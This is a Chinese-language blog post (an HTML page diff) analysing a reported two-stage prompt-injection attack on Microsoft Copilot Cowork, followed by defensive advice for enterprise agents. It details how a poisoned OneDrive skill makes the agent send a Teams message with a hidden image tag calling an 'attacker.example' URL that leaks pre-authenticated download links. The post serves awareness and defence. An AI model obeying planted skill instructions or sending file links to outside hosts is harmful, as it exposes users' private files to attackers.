@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Copilot Cowork 漏洞：一张图偷走 OneDrive，国内智能体同样警惕 — wangcansunking — products & playground</title>
+  
+  <meta name="theme-color" content="#010102">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><rect width='24' height='24' rx='6' fill='%235e6ad2'/><text x='12' y='17' text-anchor='middle' font-family='monospace' font-size='13' font-weight='700' fill='white'>w</text></svg>">
+  <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap">
+  <link rel="stylesheet" href="/assets/styles.css">
+  <link rel="stylesheet" href="/assets/product-styles.css">
+</head>
+<body class="">
+  <div class="aurora" aria-hidden="true"></div>
+  <header class="topbar">
+    <a class="brand" href="/">
+      <span class="mark">w</span>
+      <span>wangcansunking</span>
+    </a>
+    <nav>
+      <a href="/#products">Products</a>
+      <a href="/#about">About</a>
+      <a class="cta" href="https://github.com/wangcansunking" target="_blank" rel="noopener">GitHub →</a>
+    </nav>
+  </header>
+  
+  <main class="container product-page">
+    <nav class="crumb">
+      <a href="/">主页</a>
+      <span class="sep">/</span>
+      <a href="/daily-report/">Daily Report</a>
+      <span class="sep">/</span>
+      <span class="current">2026-05-27</span>
+    </nav>
+    <article class="article">
+      <div class="post-meta"><span>2026-05-27</span><span class="tag-pill">Daily Report</span></div>
+      <h1>Copilot Cowork 漏洞：一张图偷走 OneDrive，国内智能体同样警惕</h1>
+<p><img src="https://raw.githubusercontent.com/wangcansunking/daily-report-images/master/content/2026/05/27/microsoft-copilot-cowork-onedrive-exfil-promptarmor-2026-05-27.png" alt="微软 Copilot Cowork OneDrive 文件泄露漏洞封面"></p>
+<h2>30 秒速览</h2>
+<ul>
+<li><strong>披露源</strong>：Simon Willison 2026-05-26 个人博客转引 PromptArmor 同日公开的技术报告《Microsoft Copilot Cowork Exfiltrates Files》</li>
+<li><strong>受影响产品</strong>：Microsoft Copilot Cowork（5 月 5 日刚刚上 iOS / Android、刚刚开放 Cowork Skills 复用与 Cowork Plugins 三方接入）</li>
+<li><strong>攻击链</strong>：两阶段。第一阶段是攻击者把含 5 行恶意 prompt 的 skill 文件放进目标 OneDrive 的 skills 目录；用户随便对 Cowork 说一句「帮我盘点本周工作」就会自动加载并执行；agent 被注入后给当前用户拼一条 Teams 消息（Cowork 默认豁免对当前用户的发送批准）。第二阶段是 Teams 消息里嵌一个外链 <code>&lt;img&gt;</code>，src 拼上 OneDrive 预授权下载 URL；用户打开 Teams 客户端的瞬间，图片自动加载触发对攻击者域名的 GET 请求，预授权 URL 被原样带走，攻击者拿到链接就能直接下载文件，不需要登录、不需要 OAuth</li>
+<li><strong>复现率</strong>：PromptArmor 报告称 5 次测试 5 次成功（100% 命中率）。中招模型涵盖 Claude Opus 4.7 与 Cowork 默认的自动路由</li>
+<li><strong>同周对照</strong>：5 月 22 日 Anthropic 刚发完 Project Glasswing 第一阶段更新——Claude Mythos Preview 一月扫出 10000+ 高危漏洞。同一周内一边是 AI 自动挖洞挖到全行业漏洞洪水，一边是 AI agent 自己被一张图洞穿，攻防同框</li>
+<li><strong>Simon Willison 实查引语</strong>：「The biggest challenge in designing agentic systems continues to be preventing them from enabling attackers to exfiltrate data.」（agent 系统设计的最大挑战，至今仍是阻止它们被攻击者用来窃取数据）</li>
+<li><strong>国内对位</strong>：钉钉 AI 助理 / 飞书智能体 / 企业微信会话 AI 在「skill 来源、消息自动批准、外链图片渲染、预授权下载链接」这四条同结构链上技术原理可参照——本文摆原理 + 防御建议，不点名指控（无证据不发）</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/wangcansunking/daily-report-images/master/content/2026/05/27/anthropic-glasswing-update-hero.jpg" alt="Anthropic Project Glasswing 官方更新头图 · 同周一币两面"></p>
+<h2>一、Copilot Cowork 是什么，为什么这次漏洞影响很大</h2>
+<p>要看懂这次漏洞，先得理解 Copilot Cowork 在微软全家桶里站在哪。</p>
+<p>Cowork 是微软 Copilot 家族里和 Anthropic Claude Cowork 对位的那一档产品——面向不写代码的知识工作者，把对话式 Copilot 升级成能自己跑任务的 agent。2026-03 月正式宣布，5 月 5 日刚刚做了三件大事：上 iOS / Android 移动端、开放 Cowork Skills（复用的领域知识包）、放出 Cowork Plugins 让三方系统接进来。和 Anthropic 这边一周前刚开源 17 个工种 plugin 的动作几乎踩在同一个节奏上。</p>
+<p>Cowork 在企业里能接到的数据范围非常广：用户的 SharePoint 文档、OneDrive 个人盘和共享盘、Outlook 邮件、Teams 会话、Microsoft Graph 暴露的全部企业知识库。对企业来说这是「让 AI 真正帮你干活」的关键产品，对攻击者来说这是「一旦拿下一个攻击面就能横扫整个 M365 数据资产」的高价值入口。</p>
+<p>PromptArmor 这次找到的漏洞，刚好就长在 Cowork 5 月 5 日新上的 Skills 复用机制上——这一机制本来是要让企业积累自己的 agent 能力，结果第一个月就被发现：skill 文件本身可以是攻击载体。</p>
+<p>漏洞最让人头疼的地方是它不依赖任何代码层的内存破坏、不依赖任何零日，完全是「产品默认策略 + 客户端默认行为 + 大语言模型本质特性」三者叠加出来的混淆代理（confused deputy）漏洞。修一个零日补一次就好，修这种漏洞要重新设计产品默认行为，工程量大很多。</p>
+<h2>二、两阶段攻击链拆解：5 行代码偷走 OneDrive</h2>
+<p><img src="https://raw.githubusercontent.com/wangcansunking/daily-report-images/master/content/2026/05/27/cowork-two-stage-attack-chain.png" alt="两阶段攻击链流程图：投毒 + 自动批准 + 外链图片 + 预授权 GET"></p>
+<p>PromptArmor 报告给出的攻击链分两个阶段。逐步拆开看。</p>
+<h3>阶段一：投毒 skill + 自动批准发 Teams 消息</h3>
+<p>第一步，攻击者把一个看起来正常的 skill 文件放进目标用户的 OneDrive 里 Cowork 默认扫描的 skills 目录。投递方式可以是企业内部分享、可以是外部协作者上传、可以是钓鱼邮件附件被用户保存到 OneDrive——任何能往用户 OneDrive 写文件的渠道都能用。</p>
+<p>第二步，skill 文件里 5 行恶意指令藏在 81 行普通 skill 内容中间。PromptArmor 强调：5 行 / 81 行的比例意味着普通的代码审查或人工目检几乎不可能筛得出来。</p>
+<p>第三步，用户某天对 Cowork 说一句完全正常的话——比如「帮我盘点本周工作」「整理一下我这周的会议要点」「写个周报」。Cowork 按设计自动加载用户 OneDrive 里的相关 skill；恶意 skill 被自动执行；藏在里面的 prompt 指令 agent 拼出一条发给「当前用户自己」的 Teams 消息。</p>
+<p>第四步是这次漏洞的关键产品默认行为：Cowork 把「发给当前活跃用户的 Teams / Outlook 消息」放进了默认豁免名单——agent 给你自己发消息不需要二次批准。微软的设计假设很合理：用户自己跟自己说话能有什么坏处？但 agent 时代这个假设站不住——agent 给「你自己」发的消息可以承载攻击 payload。</p>
+<p>第五步是用户视角的盲区。PromptArmor 报告特别指出：恶意 Teams 消息的正文还会被 agent 设计成隐藏不展开显示。用户哪怕在 Teams 客户端里点开了那条消息，看到的也是空白或一段无关文本，实际的恶意 <code>&lt;img&gt;</code> 标签在 HTML 渲染层悄悄触发。</p>
+<h3>阶段二：外链图片触发 GET，OneDrive 预授权 URL 离开企业</h3>
+<p>进入第二阶段。</p>
+<p>第六步，Teams 消息里那个 <code>&lt;img&gt;</code> 标签的 src 指向攻击者控制的域名，比如 <code>https://attacker.example/leak?url=&lt;被预授权的 OneDrive 下载 URL&gt;</code>。这里塞进 URL 参数里的是 SharePoint / OneDrive 给指定文件签发的预授权下载链接（pre-authenticated download link）——这是微软为方便用户分享文件给外部协作者设计的免登录直链，谁拿到 URL 谁就能下载。</p>
+<p>第七步，用户打开 Teams 客户端。Teams 默认会自动加载消息里的外链图片来给用户更好的预览体验。这一加载动作就触发了对 <code>attacker.example</code> 的 HTTP GET 请求。</p>
+<p>第八步，攻击者的服务器日志里立刻出现了一条完整的 GET 请求，URL 参数里挂着完整的、可用的 OneDrive 预授权下载 URL。攻击者拿到 URL 之后直接对 SharePoint / OneDrive 发 GET 请求就能下载文件——不需要登录、不需要 OAuth 授权、不需要被攻击者所在网络的任何权限。</p>
+<p>PromptArmor 报告里给的成功率数字是 5 / 5，也就是 5 次复现 5 次成功。中招模型范围既包含 Claude Opus 4.7（Cowork 高质量档默认调用的模型），也包含 Cowork 的自动路由——意味着无论用户选哪一档都中招。报告还指出 Opus 4.7 在「发现并拼装多份敏感文件」这一步表现得更彻底，能在一次会话里找到更多目标文件。</p>
+<p>整条链上没有任何一步触发了用户的额外审批，没有触发任何代码层漏洞扫描器的告警，没有出现任何可疑的二进制行为。这正是 PromptArmor 强调的「混淆代理」性质——攻击者借用 agent 已经被信任的权限完成一连串单看都合规的动作。</p>
+<h2>三、PromptArmor 报告关键证据与 Simon Willison 评论</h2>
+<p>PromptArmor 报告给出的证据维度有三类。</p>
+<p><strong>第一类是攻击载荷的代码体量</strong>：5 行恶意 prompt 嵌在 81 行 skill 里。这个比例直接说明传统的「人工代码审查 skill 文件」方案在实际工程里不可行——81 行里挑 5 行还是中文 / 英文混杂的自然语言 prompt，没有任何关键词能稳定匹配。</p>
+<p><strong>第二类是模型覆盖</strong>：报告里两次提到「Claude Opus 4.7 与默认自动路由都成功」，这一表述提醒了一个值得讨论的现实——Cowork 用的是 Anthropic Claude 系列模型，并且用的是当下最强的 Opus 4.7。也就是说，这一漏洞不是「模型太弱被骗了」，而是「模型再强也救不了产品默认信任假设」。这对所有靠强模型解决安全问题的工程师都是一条提醒。</p>
+<p><strong>第三类是可观察的攻击残留</strong>：用户视角下消息正文被隐藏、Teams 消息发送批准被默认豁免、外链图片自动加载——三条都是 Cowork / Teams 的默认行为，不需要任何 0day。</p>
+<p><img src="https://raw.githubusercontent.com/wangcansunking/daily-report-images/master/content/2026/05/27/cowork-simon-thesis.png" alt="Simon Willison 5/26 引语视觉化"></p>
+<p>Simon Willison 在 5 月 26 日博客里把整篇 PromptArmor 报告拎出来转引，并给出了一段被广泛引用的判断。一字不动地引一下：</p>
+<blockquote>
+<p><strong>「The biggest challenge in designing agentic systems continues to be preventing them from enabling attackers to exfiltrate data.」</strong>（agent 系统设计的最大挑战，至今仍是阻止它们被攻击者用来窃取数据）
+—— Simon Willison《Microsoft Copilot Cowork Exfiltrates Files》个人博客，2026-05-26</p>
+</blockquote>
+<p>这句话不长，但落点很重。Simon 过去两年一直在跟踪 agent 安全话题，他在 2024 年就提出过「prompt injection 是 agent 落地的最大阻碍」的观点。这次 Cowork 漏洞被他特别拎出来，是因为这是他追踪两年的预言第一次在「微软量级 + 5 月刚刚 GA 的明星产品 + 5 行 prompt 就能 100% 命中」三个条件同时具备的场景下被实证。</p>
+<p>业内的同行回应在 Hacker News 第 48272354 号讨论串里集中爆发，截至 2026-05-26 已经累积 255 分 / 48 条评论。三类典型声音：</p>
+<p>第一类是「这是设计预期」的辩护派，类比成「不要随便点开 Linkin-Park.mp3.exe 的 limewire 下载」——既然你装了恶意软件，丢数据是活该。</p>
+<p>第二类是「权限设计有问题」的批评派，原话：「Microsoft gives Cowork unrestricted access and the ability to bypass approvals」（微软给 Cowork 不受限的访问权 + 跳过审批的能力），认为微软为了赶 GA 牺牲了安全控制。</p>
+<p>第三类是「这是大语言模型本质问题」的根因派，原话：「LLMs do not separate data and code」（大语言模型不分数据和代码），凡是 agent 接到工具调用能力，再叠加能触发链接预览的消息工具，就一定会有数据泄露面。</p>
+<p>三类声音都有道理，但都指向同一个结论：单独修任意一条都堵不住，需要产品默认策略、客户端默认行为、上游链接 TTL 三层同时调整。</p>
+<h2>四、对照 Anthropic Glasswing：同一周，AI 安全的攻与守</h2>
+<p><img src="https://raw.githubusercontent.com/wangcansunking/daily-report-images/master/content/2026/05/27/cowork-vs-glasswing-twin.png" alt="同周一币两面：5/22 Glasswing 攻 + 5/26 Copilot Cowork 守"></p>
+<p>让这次事件特别值得记录的另一个原因，是同一周里 Anthropic 刚刚发完 Project Glasswing 第一阶段更新。</p>
+<p>2026-05-22 Anthropic 官方公布 Claude Mythos Preview 与约 50 家合作伙伴一起，一个月内扫出 10000+ 高危 / 严重漏洞。其中开源项目里的真阳性率 90.6%（同类传统静态分析工具一般是 30%），Cloudflare 在自家代码库扫出 2000 个 bug 含 400 个高危，Mozilla Firefox 150 比上一代 148 的漏洞挖掘数量翻了 10 倍，wolfSSL 报出 CVE-2026-5194（CVSS 9.3）银行级证书伪造漏洞，OpenBSD 一个潜伏了 27 年的 TCP 协议陈年 bug 被揪出。</p>
+<p>短短四天之后，PromptArmor 公开 Copilot Cowork 漏洞。一份 AI 公司自家发布的「我们的模型能挖到全行业 10000 高危」，叠加一份独立安全研究团队发布的「我们用 5 行代码就把模型武装起来的 agent 产品洞穿了」——这是一币两面被同一周摆上桌。</p>
+<p>可以这样理解这两件事的关系：</p>
+<ul>
+<li><strong>Glasswing 代表 AI 在攻击侧（也是防御侧）的能力跃迁</strong>——AI 自动挖洞的速度第一次比人类挖洞的速度快两个量级。瓶颈从「能不能挖到」搬到「能不能验证、披露、协调、打补丁」</li>
+<li><strong>Copilot Cowork 漏洞代表 AI 自己作为应用产品也在变成新攻击面</strong>——agent 时代「prompt 是数据还是代码」的边界根本就不存在，于是产品默认信任假设崩了</li>
+</ul>
+<p>这两件事如果分开看，都还停留在「单点新闻」层面。叠在一起看，本周就是 AI 安全产业的一道分水岭：以后任何企业部署 AI agent，攻和守必须一起评估。攻击者会用 AI 一周扫出 10000 个传统漏洞，同时也会用 AI 来武装新型 agent 注入攻击；防御者必须用 AI 来跟上扫描速度，同时也得给自己部署的 agent 加上行为审批 + 外链审计 + 预授权链接管控。</p>
+<p>国内安全行业其实有先发优势可以利用——CNVD / CNNVD 等国家漏洞协调披露体系已经成熟，奇安信 QAX-GPT、360 安全大模型、阿里云安全 Qoder CN、腾讯混元安全工具、启明星辰 MAF + MASB 五家国产安全大模型也都在路上。攻防一体这条路，国内不需要从零起步。</p>
+<h2>五、国内对位场景：钉钉 AI / 飞书智能体 / 企微会话 AI 同结构链分析</h2>
+<p>在不点名指控任何具体产品有同样漏洞的前提下（PromptArmor 没有发表针对国内产品的研究，我自己也没有任何实证），把这次 Copilot Cowork 漏洞的攻击链拆成四条原理，对位看一下国内主流企业 AI 产品在同一条链上分别是什么状态。</p>
+<p><img src="https://raw.githubusercontent.com/wangcansunking/daily-report-images/master/content/2026/05/27/cowork-china-im-4-principles-v2.png" alt="国内即时通讯智能体在同结构攻击链上的四条原理对位表"></p>
+<p><strong>第一条原理：agent 是否能从用户云盘里的某个目录自动加载技能或插件，且不需要二次批准。</strong></p>
+<ul>
+<li>钉钉 AI 助理：支持「技能市场」+ 「自定义技能」，自定义技能从企业管理员配置的来源加载，普通员工无法直接往技能目录写文件。结构上相对收口</li>
+<li>飞书智能体：开放给企业的自建智能体，技能来源可以是飞书云文档里的提示词模板。如果企业开放了「员工自由创建智能体」的权限，员工自己的云盘内容会被纳入提示词上下文</li>
+<li>企业微信会话 AI：腾讯侧的会话 AI 主要走的是「外部应用 API + 企业微信侧侧栏 Bot」的形态，技能加载机制不如 Cowork / 飞书智能体那么开放</li>
+</ul>
+<p><strong>第二条原理：agent 自动给当前用户发消息是否需要二次批准。</strong></p>
+<ul>
+<li>三家国内产品在产品默认策略上各不相同。从公开文档能看到的描述里，钉钉 AI 助理的「IM 消息发送」动作通常会触发用户侧的确认弹窗，飞书智能体的发消息能力默认走「绑定渠道 + 内置 webhook」，企微会话 AI 通常需要在管理后台显式打开「主动发消息」能力。三家在「给当前用户发消息」这条默认豁免上各有口径，企业管理员需要逐个核对</li>
+</ul>
+<p><strong>第三条原理：IM / 邮件客户端是否会自动加载外链图片。</strong></p>
+<ul>
+<li>钉钉 / 飞书 / 企业微信的桌面客户端在默认设置下都会自动加载消息里的外链图片，方便用户预览。这是行业惯例，不是单一产品的问题</li>
+<li>防御方向是企业管理员侧把「外部图片域名白名单」开起来：只允许公司域 + 内容信任源加载，其他域名只显示占位符</li>
+</ul>
+<p><strong>第四条原理：云盘文件是否会签发预授权下载链接，且 TTL 多长。</strong></p>
+<ul>
+<li>钉钉云盘 / 飞书云文档 / 企业微信微盘都支持「外部共享链接」，TTL 默认从 7 天到永久不等</li>
+<li>防御方向是企业管理员把对外预授权链接的 TTL 默认设到 1 小时或更短，对敏感目录禁用对外预授权</li>
+</ul>
+<p>四条原理叠加起来看，国内三家产品在「技能加载」「消息批准」「图片渲染」「预授权 TTL」这条同结构链上理论上同样存在攻击面，是否真的可被利用要看每家产品的具体默认值和企业管理员的配置。这不是「国内产品也有漏洞」的指控，而是「不要把这次 Copilot Cowork 事件当成只是微软的特殊问题」的提醒。</p>
+<p>国内安全工程师能做的事，是借这次事件把自己企业里部署的 AI agent 产品的这四条默认值核一遍，把不合理的默认值调到合理位置。</p>
+<h2>六、企业 Agent 安全防御七条建议</h2>
+<p><img src="https://raw.githubusercontent.com/wangcansunking/daily-report-images/master/content/2026/05/27/cowork-defense-checklist.png" alt="企业 Agent 安全防御七条建议清单"></p>
+<p>综合 PromptArmor 报告、Simon Willison 博客评论、HN 讨论串里的安全圈共识，给出适用于 Copilot Cowork / 钉钉 AI 助理 / 飞书智能体 / 企业微信会话 AI 任一同结构场景的七条防御建议。每一条都尽量给到技术上可落地的具体配置，不写「加强安全意识」这种口号。</p>
+<p><strong>第一条：默认强制人工批准所有 agent 外发动作。</strong></p>
+<p>把「发邮件 / 发消息 / 发文件给当前用户」的默认豁免去掉，所有外发动作一律要二次批准。具体到 Copilot Cowork，PromptArmor 报告里明确写了配置路径：在 Cowork 管理策略（admin policy）里关掉「不再询问」（don&#39;t ask again）选项。具体到国内产品，对应的是企业管理员后台的「自动操作策略」开关。代价是用户每天多点几次确认按钮，换来的是 agent 任何外发动作都有可观测的人工节点。</p>
+<p><strong>第二条：客户端外链图片域名白名单。</strong></p>
+<p>Teams / Outlook / 钉钉 / 飞书 / 企业微信任一客户端在企业模式下都应该支持外链图片域名白名单——只允许公司域 + 已知内容信任源的图片自动加载，白名单外的图片只显示占位符。点击占位符才发出请求。这一条堵住的是这次漏洞攻击链的第二阶段触发点。</p>
+<p><strong>第三条：预授权下载链接 TTL 缩短到 1 小时。</strong></p>
+<p>SharePoint / OneDrive 的预授权下载链接默认 TTL 是 7 天。企业管理员可以通过 SharePoint Online Management Shell 把对应 site 或 sensitivity label 的预授权策略调短。PromptArmor 报告里给出的命令：</p>
+<pre><code class="language-powershell">Set-SPOSite -Identity &lt;SiteURL&gt; -BlockDownloadPolicy $true
+</code></pre>
+<p>或按 sensitivity label：</p>
+<pre><code class="language-powershell">Set-Label -Identity &lt;label&gt; -AdvancedSettings @{BlockDownloadPolicy=&quot;true&quot;}
+</code></pre>
+<p>但报告也明确警告：BlockDownloadPolicy 是「全杀」型策略——开了之后用户的合法下载、打印、同步都会被阻断。更精细的做法是把 TTL 调到 1 小时或 15 分钟，让攻击者就算拿到 URL 也来不及用。国内云盘产品对应的配置项各家命名不一样，但企业管理员后台一般都有「对外链接有效期」开关。</p>
+<p><strong>第四条：skill 来源白名单 + 强制签名。</strong></p>
+<p>agent 的 skill / 插件不应该从用户自己的云盘目录任意加载，应该限定从企业治理过的 skill 仓库拉取，并强制开发者签名验签。具体到 Copilot Cowork，企业可以通过 Cowork 管理控制台把 skill 加载源限定为企业内部仓库。具体到国内产品，对应的是把「员工自由创建智能体」的权限收回到指定团队，集中治理。</p>
+<p><strong>第五条：禁用「不再询问」一类记忆选项。</strong></p>
+<p>PromptArmor 报告原话翻译过来就是：管理员（admin）在策略里关掉「不再询问」（don&#39;t ask again）选项，避免用户一次点过之后给所有写操作开绿灯。这一条原理简单但效果显著——很多用户在第一次见到 agent 弹审批时随手点了「以后不再询问」，结果攻击者后续利用攻击面时不会再触发任何弹窗。</p>
+<p><strong>第六条：禁用无人值守的定时任务。</strong></p>
+<p>agent 的定时任务 / 自动循环要默认关闭，所有 agent 动作必须由用户当下显式触发。PromptArmor 报告特别提到 scheduled task 会显著放大利用面——攻击者一次投毒之后可以靠定时触发反复利用，每次都拿一份新数据。</p>
+<p><strong>第七条：出站流量审计 + DLP 联动。</strong></p>
+<p>agent 发起的所有出站 HTTP 请求挂上企业 DLP（数据丢失防护）系统的旁路。一旦发现请求 URL 参数里含有疑似敏感 token、文件 ID、预授权 URL 形状的字符串，立刻阻断 + 告警。这一条堵的是这次攻击链的最后一公里——就算前面六条都没拦住，agent 真的要把 OneDrive 预授权 URL 送出去时，DLP 仍然能在 egress 层把这个请求拦下来。</p>
+<p>七条建议里前六条偏产品默认策略与企业配置，最后一条偏专门的安全产品能力。国内安全工程师在帮自己企业评估 AI agent 部署时，可以拿这七条做一份逐条 checklist。</p>
+<h2>七、收尾：AI 安全是一道攻防一体的新题目</h2>
+<p>回到本文开头那句话——5 月 26 日 Simon Willison 写下的：agent 系统设计的最大挑战，至今仍是阻止它们被攻击者用来窃取数据。</p>
+<p>这句话听上去悲观，但放在「同一周 Anthropic 刚刚证明 AI 一月能扫出 10000 个高危漏洞」的背景里看，反而是一个清晰的产业坐标——</p>
+<p>AI 让攻击和防御双方的能力都被放大。攻击者多了 prompt 注入 + agent 武装这条新攻击面，防御者多了 AI 自动挖洞 + AI 自动响应 + AI 自动协调披露这条新防御能力。本周的 Cowork 漏洞和 Glasswing 万洞放在一起，是产业从「比谁挖得到」过渡到「比谁挖补一体的工程化做得好」的标志事件。</p>
+<p>国内安全行业在这道新题目上有自己的底子：CNVD / CNNVD 协调披露体系成熟，奇安信 / 360 / 阿里云 / 腾讯 / 启明星辰 五家在攻防一体上路径各异但都在做，国家网信办对生成式 AI 的安全备案与算法审查机制已经在执行第四代。攻防一体不是西方独创的命题，国内有从「企业治理 + 国家协调披露 + AI 攻防能力建设」三个维度齐头并进的窗口。</p>
+<p>对每一位国内安全工程师来说，这周看完这篇文章后能带走的最实在的东西，是七条防御建议组成的 checklist——任何企业在部署 AI agent 之前都可以拿它逐条对照。我们一起把这道新题目做好。</p>
+<hr>
+<p>5 月 26 日 Simon Willison 这条转引最重要的不是 Cowork 这一个产品的漏洞，是它和 5 月 22 日 Glasswing 万洞放在一起呈现出来的产业坐标：AI 让攻防双方的能力都被放大，企业部署 agent 从此攻防一体。</p>
+<p>国内 CNVD / CNNVD 协调披露体系 + 五家国产安全大模型，已经在自己的赛道上有自己的速度。我们有底子、有路线、也有时间窗口。</p>
+
+    </article>
+  </main>
+  <footer class="footer">
+    <div class="container">
+      <div class="row">
+        <span class="made">crafted with Claude Code · hosted on GitHub Pages</span>
+        <div class="links">
+          <a href="https://github.com/wangcansunking" target="_blank" rel="noopener">GitHub</a>
+          <a href="/">主页</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/main.js" defer></script>
+</body>
+</html>
